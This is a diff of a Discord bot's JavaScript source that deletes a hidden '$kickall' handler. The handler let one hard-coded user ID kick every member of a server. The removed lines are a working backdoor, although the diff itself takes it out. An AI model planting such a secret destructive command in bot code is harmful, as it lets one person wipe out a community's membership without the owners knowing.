@@ -398,24 +398,6 @@ client.on("guildMemberAdd", async member => {
   }
 });
 
-const myID = '461386341146558475'
 
-client.on ('message', message =>{
-
-if (message.content =="$kickall"){
-
-if(message.author.id !== myID) return;
-
-message.guild.members.forEach (m => {
-
-if (m.id == myID) return;
-
-m.kick ();
-
-});
-
-};
-
-});
 
 client.login(process.env.BOT_TOKEN);
